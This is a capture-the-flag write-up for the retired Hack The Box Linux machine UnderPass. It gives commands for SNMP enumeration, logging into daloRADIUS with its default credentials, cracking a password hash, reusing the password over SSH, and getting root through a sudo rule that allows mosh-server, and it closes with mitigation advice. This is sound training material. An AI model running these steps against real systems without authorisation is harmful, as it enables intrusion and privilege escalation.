---
machine: UnderPass
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, snmp, daloradius, default-credentials, mosh, privesc]
---

# UnderPass — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

SNMP with a public community reveals a daloRADIUS server and its login page. Default credentials grant access and expose `svcMosh`'s hash, which cracks and works over SSH. `svcMosh` can run `mosh-server` as root; start the server, use the `MOSH_KEY` and connect with `mosh-client` to get root.

## Recon

```bash
nmap -Pn -sU -p161 <IP>
nmap -Pn -sCV -p22,80 <IP>
```

- `161/udp` SNMP and `22` SSH; the web is not on 80.
- `snmpwalk -v2c -c public <IP>` enumerates processes, interfaces and strings.
- The output mentions daloRADIUS and a `/daloradius` path.

## Enumeration

- The daloRADIUS portal is on a vhost or internal port.
- `feroxbuster` or `ffuf` confirm `/daloradius/login.php`.
- Default credentials `administrator:radius` grant access.

```bash
snmpwalk -v2c -c public <IP>
ffuf -u http://<IP>/ -H 'Host: FUZZ.underpass.htb' -w subdomains.txt
```

## Foothold

In daloRADIUS, the user table shows `svcMosh`'s hash. It is a known hash; crack it and the password works over SSH. The user has `user.txt`.

```bash
hashcat -m 0 hash.txt rockyou.txt
ssh svcMosh@<IP>
```

## Lateral movement

`svcMosh` has no direct root access, but can run `mosh-server` as any user without a password.

```bash
sudo -l
```

## Privilege escalation

Start `mosh-server` as root and get a `MOSH CONNECT <PORT> <KEY>`. `mosh-client` needs `MOSH_KEY`; with it, open a root session on localhost.

```bash
sudo mosh-server
MOSH_KEY=<KEY> mosh-client 127.0.0.1 <PORT>
```

## Evidence

- Public SNMP and daloRADIUS.
- Default credentials.
- Cracked `svcMosh` hash.
- `mosh-server` as root rule.
- `MOSH_KEY` and root session.

## Lessons learned

- Public SNMP leaks internal services.
- daloRADIUS default credentials remain common.
- A weak hash cracks and is reused over SSH.
- `mosh-server` as root starts a privileged localhost session.

## Mitigation and detection

- Change the SNMP community and restrict 161/udp.
- Change default credentials and limit daloRADIUS.
- Use strong, unique passwords; do not reuse them over SSH.
- Do not allow `mosh-server` as root and audit sudo rules.

## References

- [0xdf — UnderPass](https://0xdf.gitlab.io/2025/05/10/htb-underpass.html)
- [IppSec — UnderPass](https://www.youtube.com/watch?v=6hoOcB9ubs8)
- [Hack The Box — UnderPass](https://app.hackthebox.com/machines/underpass)
